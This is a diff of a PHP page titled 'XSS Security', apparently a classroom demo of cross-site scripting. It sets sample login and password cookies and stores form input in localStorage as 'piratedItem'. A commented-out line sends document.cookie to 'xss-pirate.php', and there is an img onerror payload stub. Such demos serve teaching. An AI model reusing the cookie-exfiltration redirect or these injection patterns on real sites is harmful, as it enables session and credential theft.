@@ -4,8 +4,7 @@
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>XSS Security</title>
-        <link rel="stylesheet" href="../public/front/css/styles.css">
-        <link rel="stylesheet" href="style.css">
+        <link rel="stylesheet" href="../style.css">
         <script>
             document.cookie="login=User";
             document.cookie="password=User.uwu34*!";
@@ -24,13 +23,13 @@
             }
         ?>
     </head>
-    <body>
+    <body class="darkMode">
         <header>
             <h1><?= $title; ?></h1>
-            <a href="../index.php">Retour au Blog</a>
+            <?php require("../nav.php");?>
         </header>
         <main>
-            <form method="POST" action="#">
+            <form method="GET" action="xss-pirate.php">
                 <textarea type="text" name="keyword" rows=4 cols=20></textarea>
                 <input type="submit" name="submit" value="Envoyer" />
             </form>
@@ -40,7 +39,7 @@
         </main>
         <script>//document.querySelector("section").innerHTML += "<p style='color:red'> Site infecté</p>";</script>
         <script>document.addEventListener("click", ()=>{document.querySelector("section").innerHTML += "document.querySelector("input").value"});</script>
-        <script>localStorage.setItem("piratedItem", document.querySelector("input").value);</script>            
+        <script>localStorage.setItem("piratedItem", document.querySelector("textarea").value);</script>            
         <script>//alert(localStorage.getItem("piratedItem"));</script>
         <script>//window.location.replace("xss-pirate.php/?cookie=" + document.cookie);</script>            
         <script>//<img src="https://picsum.photos/300" onerror=''></script>
